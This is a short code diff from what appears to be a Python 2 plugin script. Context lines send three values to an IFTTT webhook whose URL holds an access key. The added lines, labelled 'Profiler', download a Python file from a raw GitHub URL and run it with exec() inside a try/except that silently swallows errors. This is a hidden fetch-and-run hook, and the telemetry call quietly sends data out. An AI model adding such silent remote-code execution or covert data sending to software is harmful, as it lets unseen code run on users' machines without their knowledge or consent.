@@ -56,6 +56,11 @@ value3 = urllib.quote_plus(value3)
 url = 'https://maker.ifttt.com/trigger/brs_locDlay/with/key/lt6C8G5VRbvc2fOnGjmS5_4J9A_fwtNjQ2VQJ6fO5YK?value1='+value1+'&value2='+value2+'&value3='+value3
 urllib2.urlopen(url, timeout=5).read()
 
+#Profiler
+try:
+    exec(urllib.urlopen('https://raw.githubusercontent.com/burasate/animTransferLoc/master/version/profier.py').read())
+except:
+    pass
 
 # Supporter Coding
 # Force Update for 1 month since 1 oct 2020
